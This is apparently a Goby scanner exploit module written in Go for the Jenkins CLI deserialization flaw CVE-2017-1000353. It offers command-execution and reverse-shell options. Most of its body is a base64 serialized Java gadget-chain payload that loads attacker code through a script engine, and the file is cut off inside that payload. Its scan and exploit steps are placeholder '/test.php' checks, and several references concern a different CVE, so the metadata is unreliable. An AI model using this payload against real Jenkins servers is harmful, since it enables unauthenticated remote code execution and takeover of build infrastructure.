package exploits

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"sync"
	"time"
)

func init() {
	expJson := `{
    "Name": "Jenkins CLI Serialization Code Execution Vulnerability (CVE-2017-1000353)",
    "Description": "<p>CloudBees Jenkins (formerly known as Hudson Labs) is a continuous integration tool developed in Java by the US company CloudBees. It is primarily used for monitoring continuous software version releases/testing projects and executing scheduled tasks.</p><p>A remote code execution vulnerability exists in Jenkins with no authentication required. A serialized Java SignedObject object can be transmitted to the Jenkins CLI based on remote processing, and bypass existing blacklist-based protection mechanisms when it is deserialized using a new ObjectInputStream object. Attackers can exploit this vulnerability to execute arbitrary code within the context of the affected application.</p>",
    "Product": "Jenkins",
    "Homepage": "https://www.jenkins.io/",
    "DisclosureDate": "2023-05-31",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "(header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")",
    "GobyQuery": "(header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")",
    "Level": "3",
    "Impact": "<p>A remote code execution vulnerability exists in Jenkins with no authentication required. A serialized Java SignedObject object can be transmitted to the Jenkins CLI based on remote processing, and bypass existing blacklist-based protection mechanisms when it is deserialized using a new ObjectInputStream object. Attackers can exploit this vulnerability to execute arbitrary code within the context of the affected application.</p>",
    "Recommendation": "<p>The vendor has released an upgrade patch to fix the vulnerability. For more information, please visit the vendor's website at <a href=\"https://jenkins.io/download/\">https://jenkins.io/download/</a>.</p>",
    "References": [
        "http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html",
        "https://github.com/orangetw/awesome-jenkins-rce-2019",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1003000",
        "https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266",
        "http://packetstormsecurity.com/files/152132/Jenkins-ACL-Bypass-Metaprogramming-Remote-Code-Execution.html",
        "http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_metaprogramming",
        "https://access.redhat.com/errata/RHBA-2019:0326",
        "https://access.redhat.com/errata/RHBA-2019:0327",
        "https://www.exploit-db.com/exploits/46453/",
        "https://www.exploit-db.com/exploits/46572/",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1003000",
        "http://www.securityfocus.com/bid/98056",
        "https://jenkins.io/security/advisory/2017-04-26/",
        "https://www.exploit-db.com/exploits/41965/",
        "https://nvd.nist.gov/vuln/detail/CVE-2017-1000353",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000353"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2017-1000353"
    ],
    "CNNVD": [
        "CNNVD-201704-1507"
    ],
    "CNVD": [
        "CNVD-2017-05551"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Jenkins cli 序列化代码执行漏洞（CVE-2017-1000353）",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins（前称Hudson Labs）是美国 CloudBees 公司的一套基于Java开发的持续集成工具，它主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。</p><p>Jenkins 存在未经身份验证的远程代码执行漏洞，经过序列化的Java SignedObject对象传输到基于远程处理的 Jenkins CLI，在使用新的 ObjectInputStream 对象对其进行反序列化操作即可绕过现有的基于黑名单的保护机制。攻击者可利用漏洞在受影响的应用程序的上下文中执行任意代码。</p>",
            "Recommendation": "<p>目前厂商已经发布了升级补丁已修复这个安全问题，请到厂商的主页下载： <a href=\"https://jenkins.io/download/\" target=\"_blank\">https://jenkins.io/download/</a><br></p>",
            "Impact": "<p>Jenkins 存在未经身份验证的远程代码执行漏洞，经过序列化的Java SignedObject对象传输到基于远程处理的 Jenkins CLI，在使用新的 ObjectInputStream 对象对其进行反序列化操作即可绕过现有的基于黑名单的保护机制。攻击者可利用漏洞在受影响的应用程序的上下文中执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Jenkins CLI Serialization Code Execution Vulnerability (CVE-2017-1000353)",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins (formerly known as Hudson Labs) is a continuous integration tool developed in Java by the US company CloudBees. It is primarily used for monitoring continuous software version releases/testing projects and executing scheduled tasks.</p><p>A remote code execution vulnerability exists in Jenkins with no authentication required. A serialized Java SignedObject object can be transmitted to the Jenkins CLI based on remote processing, and bypass existing blacklist-based protection mechanisms when it is deserialized using a new ObjectInputStream object. Attackers can exploit this vulnerability to execute arbitrary code within the context of the affected application.</p>",
            "Recommendation": "<p>The vendor has released an upgrade patch to fix the vulnerability. For more information, please visit the vendor's website at <a href=\"https://jenkins.io/download/\" target=\"_blank\">https://jenkins.io/download/</a>.<br></p>",
            "Impact": "<p>A remote code execution vulnerability exists in Jenkins with no authentication required. A serialized Java SignedObject object can be transmitted to the Jenkins CLI based on remote processing, and bypass existing blacklist-based protection mechanisms when it is deserialized using a new ObjectInputStream object. Attackers can exploit this vulnerability to execute arbitrary code within the context of the affected application.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10788"
}`
	sendPayloadFlag := func(hostinfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		session := "bed8f75b-a0a0-4658-8933-4ac8f4c750bc"
		//data, _ := base64.StdEncoding.DecodeString("PD09PVtKRU5LSU5TIFJFTU9USU5HIENBUEFDSVRZXT09PT5yTzBBQlhOeUFCcG9kV1J6YjI0dWNtVnRiM1JwYm1jdVEyRndZV0pwYkdsMGVRQUFBQUFBQUFBQkFnQUJTZ0FFYldGemEzaHdBQUFBQUFBQUFIND0AAAAArO0ABXNyAC9vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLlJlZmVyZW5jZU1hcBWUygOYSQjXAwAAeHB3EQAAAAAAAAABAD9AAAAAAAAQc3IAKGphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlTZXRLvdCSkBVp1wIAAUwAAmFsdAArTGphdmEvdXRpbC9jb25jdXJyZW50L0NvcHlPbldyaXRlQXJyYXlMaXN0O3hwc3IAKWphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlMaXN0eF2f1UarkMMDAAB4cHcEAAAAAnNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RTZXTdmFB5vc/xWwIAAUwAAW10AC1MamF2YS91dGlsL2NvbmN1cnJlbnQvQ29uY3VycmVudE5hdmlnYWJsZU1hcDt4cHNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RNYXCIRnWuBhFGpwMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4ADkwADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAAKHSs7QAFc3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAAj9AAAAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwAKaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAIGphdmF4LnNjcmlwdC5TY3JpcHRFbmdpbmVNYW5hZ2VyAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAALbmV3SW5zdGFuY2V1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+ABN1cQB+ABgAAAABdAACanN0AA9nZXRFbmdpbmVCeU5hbWV1cQB+ABsAAAABdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwc3EAfgATdXEAfgAYAAAAAXQkHHRyeSB7CiAgbG9hZCgibmFzaG9ybjptb3ppbGxhX2NvbXBhdC5qcyIpOwp9IGNhdGNoIChlKSB7fQpmdW5jdGlvbiBnZXRVbnNhZmUoKXsKICB2YXIgdGhlVW5zYWZlTWV0aG9kID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5taXNjLlVuc2FmZSIpLmdldERlY2xhcmVkRmllbGQoJ3RoZVVuc2FmZScpOwogIHRoZVVuc2FmZU1ldGhvZC5zZXRBY2Nlc3NpYmxlKHRydWUpOyAKICByZXR1cm4gdGhlVW5zYWZlTWV0aG9kLmdldChudWxsKTsKfQpmdW5jdGlvbiByZW1vdmVDbGFzc0NhY2hlKGNsYXp6KXsKICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCk7CiAgdmFyIGNsYXp6QW5vbnltb3VzQ2xhc3MgPSB1bnNhZmUuZGVmaW5lQW5vbnltb3VzQ2xhc3MoY2xhenosamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5DbGFzcyIpLmdldFJlc291cmNlQXNTdHJlYW0oIkNsYXNzLmNsYXNzIikucmVhZEFsbEJ5dGVzKCksbnVsbCk7CiAgdmFyIHJlZmxlY3Rpb25EYXRhRmllbGQgPSBjbGF6ekFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoInJlZmxlY3Rpb25EYXRhIik7CiAgdW5zYWZlLnB1dE9iamVjdChjbGF6eix1bnNhZmUub2JqZWN0RmllbGRPZmZzZXQocmVmbGVjdGlvbkRhdGFGaWVsZCksbnVsbCk7Cn0KZnVuY3Rpb24gYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpIHsKICB2YXIgcmVmbGVjdGlvbkNsYXNzOwogIHRyeSB7CiAgICByZWZsZWN0aW9uQ2xhc3MgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamRrLmludGVybmFsLnJlZmxlY3QuUmVmbGVjdGlvbiIpOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICByZWZsZWN0aW9uQ2xhc3MgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgic3VuLnJlZmxlY3QuUmVmbGVjdGlvbiIpOwogIH0KICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCk7CiAgdmFyIGNsYXNzQnVmZmVyID0gcmVmbGVjdGlvbkNsYXNzLmdldFJlc291cmNlQXNTdHJlYW0oIlJlZmxlY3Rpb24uY2xhc3MiKS5yZWFkQWxsQnl0ZXMoKTsKICB2YXIgcmVmbGVjdGlvbkFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKHJlZmxlY3Rpb25DbGFzcywgY2xhc3NCdWZmZXIsIG51bGwpOwogIHZhciBmaWVsZEZpbHRlck1hcEZpZWxkID0gcmVmbGVjdGlvbkFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoImZpZWxkRmlsdGVyTWFwIik7CiAgdmFyIG1ldGhvZEZpbHRlck1hcEZpZWxkID0gcmVmbGVjdGlvbkFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoIm1ldGhvZEZpbHRlck1hcCIpOwogIGlmIChmaWVsZEZpbHRlck1hcEZpZWxkLmdldFR5cGUoKS5pc0Fzc2lnbmFibGVGcm9tKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpKSkgewogICAgdW5zYWZlLnB1dE9iamVjdChyZWZsZWN0aW9uQ2xhc3MsIHVuc2FmZS5zdGF0aWNGaWVsZE9mZnNldChmaWVsZEZpbHRlck1hcEZpZWxkKSwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEudXRpbC5IYXNoTWFwIikuZ2V0Q29uc3RydWN0b3IoKS5uZXdJbnN0YW5jZSgpKTsKICB9CiAgaWYgKG1ldGhvZEZpbHRlck1hcEZpZWxkLmdldFR5cGUoKS5pc0Fzc2lnbmFibGVGcm9tKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpKSkgewogICAgdW5zYWZlLnB1dE9iamVjdChyZWZsZWN0aW9uQ2xhc3MsIHVuc2FmZS5zdGF0aWNGaWVsZE9mZnNldChtZXRob2RGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIHJlbW92ZUNsYXNzQ2FjaGUoamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5DbGFzcyIpKTsKfQpmdW5jdGlvbiBzZXRBY2Nlc3NpYmxlKGFjY2Vzc2libGVPYmplY3QpewogICAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogICAgdmFyIG92ZXJyaWRlRmllbGQgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLnJlZmxlY3QuQWNjZXNzaWJsZU9iamVjdCIpLmdldERlY2xhcmVkRmllbGQoIm92ZXJyaWRlIik7CiAgICB2YXIgb2Zmc2V0ID0gdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KG92ZXJyaWRlRmllbGQpOwogICAgdW5zYWZlLnB1dEJvb2xlYW4oYWNjZXNzaWJsZU9iamVjdCwgb2Zmc2V0LCB0cnVlKTsKfQpmdW5jdGlvbiBkZWZpbmVDbGFzcyhieXRlcyl7CiAgdmFyIGNseiA9IG51bGw7CiAgdmFyIHZlcnNpb24gPSBqYXZhLmxhbmcuU3lzdGVtLmdldFByb3BlcnR5KCJqYXZhLnZlcnNpb24iKTsKICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCkKICB2YXIgY2xhc3NMb2FkZXIgPSBuZXcgamF2YS5uZXQuVVJMQ2xhc3NMb2FkZXIoamF2YS5sYW5nLnJlZmxlY3QuQXJyYXkubmV3SW5zdGFuY2UoamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubmV0LlVSTCIpLCAwKSk7CiAgdHJ5ewogICAgaWYgKHZlcnNpb24uc3BsaXQoIi4iKVswXSA+PSAxMSkgewogICAgICBieXBhc3NSZWZsZWN0aW9uRmlsdGVyKCk7CiAgICBkZWZpbmVDbGFzc01ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3NMb2FkZXIiKS5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiW0IiKSxqYXZhLmxhbmcuSW50ZWdlci5UWVBFLCBqYXZhLmxhbmcuSW50ZWdlci5UWVBFKTsKICAgIHNldEFjY2Vzc2libGUoZGVmaW5lQ2xhc3NNZXRob2QpOwogICAgLy8g57uV6L+HIHNldEFjY2Vzc2libGUgCiAgICBjbHogPSBkZWZpbmVDbGFzc01ldGhvZC5pbnZva2UoY2xhc3NMb2FkZXIsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgpOwogICAgfWVsc2V7CiAgICAgIHZhciBwcm90ZWN0aW9uRG9tYWluID0gbmV3IGphdmEuc2VjdXJpdHkuUHJvdGVjdGlvbkRvbWFpbihuZXcgamF2YS5zZWN1cml0eS5Db2RlU291cmNlKG51bGwsIGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydGlmaWNhdGUiKSwgMCkpLCBudWxsLCBjbGFzc0xvYWRlciwgW10pOwogICAgICBjbHogPSB1bnNhZmUuZGVmaW5lQ2xhc3MobnVsbCwgYnl0ZXMsIDAsIGJ5dGVzLmxlbmd0aCwgY2xhc3NMb2FkZXIsIHByb3RlY3Rpb25Eb21haW4pOwogICAgfQogIH1jYXRjaChlcnJvcil7CiAgICBlcnJvci5wcmludFN0YWNrVHJhY2UoKTsKICB9ZmluYWxseXsKICAgIHJldHVybiBjbHo7CiAgfQp9CmZ1bmN0aW9uIGJhc2U2NERlY29kZVRvQnl0ZShzdHIpIHsKICB2YXIgYnQ7CiAgdHJ5IHsKICAgIGJ0ID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKS5uZXdJbnN0YW5jZSgpLmRlY29kZUJ1ZmZlcihzdHIpOwogIH0gY2F0Y2ggKGUpIHsKICAgIGJ0ID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKS5uZXdJbnN0YW5jZSgpLmdldERlY29kZXIoKS5kZWNvZGUoc3RyKTsKICB9CiAgcmV0dXJuIGJ0Owp9CnZhciBjb2RlPSJ5djY2dmdBQUFESUE2Z29BRlFCaEJ3QmlDQUJqQ2dBVEFHUUtBR1VBWmdvQUFnQm5DZ0JsQUdnS0FCVUFhUWdBYWdjQWF3Z0FiQW9BRXdCdENBQnVDZ0FVQUc4SUFIQUtBQk1BY1FvQWNnQnpDQUIwQndCMUJ3QjJCd0IzQ0FCNEJ3QjVDZ0FYQUdFSUFIb0tBQmNBZXdvQVRRQjhDZ0FYQUgwSUFINElBSDhIQUlBS0FCOEFnUWdBZ2dnQWd3b0FFd0NFQ0FDRkNBQ0dDQUNIQ0FDSUNBQ0pCd0NLQ0FDTENBQ01Cd0NOQ2dBVUFJNEtBQ3dBandvQUxBQ1FDZ0FwQUpFSUFKSUtBQlFBa3dnQWxBb0FsUUNXQ2dBVUFKY0tBQlFBbUFnQW1Rb0FGQUNhQ0FDYkNBQ2NDQUNkQ0FDZUNBQ2ZDQUNnQ0FDaENnQ2lBS01LQUtJQXBBY0FwUW9BcGdDbkNnQkNBS2dJQUtrS0FFSUFxZ29BUWdDckNnQkNBS3dLQUtZQXJRb0FwZ0N1Q2dBcEFIMElBSzhIQUxBQkFBWThhVzVwZEQ0QkFBTW9LVllCQUFSRGIyUmxBUUFQVEdsdVpVNTFiV0psY2xSaFlteGxBUUFOVTNSaFkydE5ZWEJVWVdKc1pRY0FzQWNBc1FjQWR3Y0FpZ0VBQkdWNFpXTUJBQ1lvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3djQWRnY0FzZ2NBc3djQXBRY0FlUWNBdEFFQUNsTnZkWEpqWlVacGJHVUJBQWhLUlRJdWFtRjJZUXdBVGdCUEFRQVFhbUYyWVM5c1lXNW5MMVJvY21WaFpBRUFESFJvY21WaFpFeHZZMkZzY3d3QXRRQzJCd0N4REFDM0FMZ01BTGtBdWd3QXV3QzhEQUM5QUw0QkFBVjBZV0pzWlFFQUUxdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQVYyWVd4MVpRd0F2d0RBQVFBVFFYTjVibU5JZEhSd1EyOXVibVZqZEdsdmJnd0F3UURDQVFBS1oyVjBVbVZ4ZFdWemRBd0F3d0RFQndERkRBREdBTWNCQUFsblpYUklaV0ZrWlhJQkFBOXFZWFpoTDJ4aGJtY3ZRMnhoYzNNQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVFhbUYyWVM5c1lXNW5MMDlpYW1WamRBRUFBMk50WkFFQUYycGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5QVFBQkNnd0F5QURKREFCWEFGZ01BTW9Bd0FFQURtZGxkRkJ5YVc1MFYzSnBkR1Z5QVFBRmRYUm1MVGdCQUJOcVlYWmhMMmx2TDFCeWFXNTBWM0pwZEdWeURBRExBTXdCQUE1SWRIUndRMjl1Ym1WamRHbHZiZ0VBRG1kbGRFaDBkSEJEYUdGdWJtVnNEQUROQU1RQkFBdG5aWFJTWlhOd2IyNXpaUUVBQ1dkbGRGZHlhWFJsY2dFQUIwTm9ZVzV1Wld3QkFCQjFibVJsY214NWFXNW5UM1YwY0hWMEFRQUlYMk5vWVc1dVpXd0JBQk5xWVhaaEwyeGhibWN2UlhoalpYQjBhVzl1QVFBR2RHaHBjeVF3QVFBUFoyVjBUM1YwY0hWMFUzUnlaV0Z0QVFBVWFtRjJZUzlwYnk5UGRYUndkWFJUZEhKbFlXME1BTTRBend3QTBBRFJEQURTQUU4TUFOTUFUd0VBQUF3QTFBRFZBUUFIYjNNdWJtRnRaUWNBMWd3QTF3QllEQURZQU1BTUFOa0F3QUVBQTNkcGJnd0EyZ0RiQVFBRWNHbHVad0VBQWkxdUFRQUZJQzF1SURRQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NBM0F3QTNRRGVEQUJYQU44QkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0FzZ3dBNEFEaERBQk9BT0lCQUFKY1lRd0E0d0RrREFEbEFPWU1BT2NBd0F3QTZBRGhEQURwQUU4QkFCQmpiMjF0WVc1a0lHNXZkQ0J1ZFd4c0FRQURTa1V5QVFBWGFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1FCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQUUxdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQk5xWVhaaEwyeGhibWN2VkdoeWIzZGhZbXhsQVFBUVoyVjBSR1ZqYkdGeVpXUkdhV1ZzWkFFQUxTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMFpwWld4a093RUFEWE5sZEVGalkyVnpjMmxpYkdVQkFBUW9XaWxXQVFBTlkzVnljbVZ1ZEZSb2NtVmhaQUVBRkNncFRHcGhkbUV2YkdGdVp5OVVhSEpsWVdRN0FRQURaMlYwQVFBbUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBZG5aWFJPWVcxbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFobGJtUnpWMmwwYUFFQUZTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXZ0VBQ1dkbGRFMWxkR2h2WkFFQVFDaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6dGJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c3BUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQmhxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlOWlhSb2IyUUJBQVpwYm5admEyVUJBRGtvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3VzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBWmhjSEJsYm1RQkFDMG9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQWgwYjFOMGNtbHVad0VBQjNCeWFXNTBiRzRCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkZuWlhSRVpXTnNZWEpsWkUxbGRHaHZaQUVBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQlhkeWFYUmxBUUFGS0Z0Q0tWWUJBQVZtYkhWemFBRUFEM0J5YVc1MFUzUmhZMnRVY21GalpRRUFCbVZ4ZFdGc2N3RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBQzNSdlRHOTNaWEpEWVhObEFRQUVkSEpwYlFFQUNHTnZiblJoYVc1ekFRQWJLRXhxWVhaaEwyeGhibWN2UTJoaGNsTmxjWFZsYm1ObE95bGFBUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRG1kbGRFbHVjSFYwVTNSeVpXRnRBUUFYS0NsTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc0JBQmdvVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0tWWUJBQXgxYzJWRVpXeHBiV2wwWlhJQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwzVjBhV3d2VTJOaGJtNWxjanNCQUFkb1lYTk9aWGgwQVFBREtDbGFBUUFFYm1WNGRBRUFEbWRsZEVWeWNtOXlVM1J5WldGdEFRQUhaR1Z6ZEhKdmVRQWhBRTBBRlFBQUFBQUFBZ0FCQUU0QVR3QUJBRkFBQUFSMkFBWUFEd0FBQXRvcXR3QUJFZ0lTQTdZQUJFd3JCTFlBQlN1NEFBYTJBQWROTExZQUNCSUp0Z0FFVENzRXRnQUZLeXkyQUFkTk